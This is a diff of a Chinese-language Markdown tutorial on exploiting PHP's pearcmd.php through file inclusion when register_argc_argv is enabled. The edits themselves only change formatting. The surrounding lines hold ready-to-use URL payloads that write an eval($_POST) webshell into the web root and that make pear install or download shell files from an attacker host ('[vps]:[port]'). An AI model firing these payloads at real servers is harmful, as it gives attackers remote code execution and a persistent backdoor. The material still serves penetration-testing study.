@@ -17,9 +17,9 @@ toc: true
 
 PECL 的全称是 The PHP Extension Community Library ，是一个开放的并通过 PEAR(PHP Extension and Application Repository，PHP 扩展和应用仓库)打包格式来打包安装的 PHP 扩展库仓库，**在docker中默认安装，路径为/user/local/lib/php.**
 
-### register\_argc\_argv
+### register_argc_argv
 
-register\_argc\_argv\=On
+register_argc_argv=On
 
 当该选项开启时（Docker 的 PHP 镜像中默认为 On），PHP 会将 HTTP 请求中的 URL 问号后面的内容注册为全局变量 \$argc（参数个数）和 \$argv（参数数组）。
 
@@ -54,7 +54,7 @@ if (isset($_SERVER['argv'])) {
 
 ### 利用
 
-当我们文件包含`pearcmd.php`时，`pearcmd.php`会读取register\_argc\_argv开启时的全局变量`$_SERVER['argv']`，变成其的命令参数，然后执行pear命令
+当我们文件包含`pearcmd.php`时，`pearcmd.php`会读取register_argc_argv开启时的全局变量`$_SERVER['argv']`，变成其的命令参数，然后执行pear命令
 
 pear参数挺多的
 
@@ -121,7 +121,7 @@ pear config-create <root_path> <file_path>
 ?+config-creater+/usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1]);?>+/var/www/html/hello.php
 ```
 
-或者
+*或者*
 
 ```txt
 ?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/test.php 
@@ -135,11 +135,11 @@ pear config-create <root_path> <file_path>
 pear install http://[vps]:[port]/test1.php
 ```
 
-利用
+### 利用：install
 
 ```bash
 ?+install+--installroot+&file=/usr/local/lib/php/pearcmd.php&+http://[vps]:[port]/shell.php
-或者
+*或者*
 /?file=/usr/local/lib/php/peclcmd.php&+install+http://vps/shell.php
 ```
 
@@ -149,11 +149,11 @@ pear install http://[vps]:[port]/test1.php
 pear download [option] [package]
 ```
 
-利用
+### 利用：download
 
 ```bash
 ?+download+file=/usr/local/lib/php/pearcmd.php&+http://[vps]:[port]/test1.php&
-或者
+*或者*
 /?file=/usr/local/lib/php/peclcmd.php&+download+http://vps/1.php
 ```
 
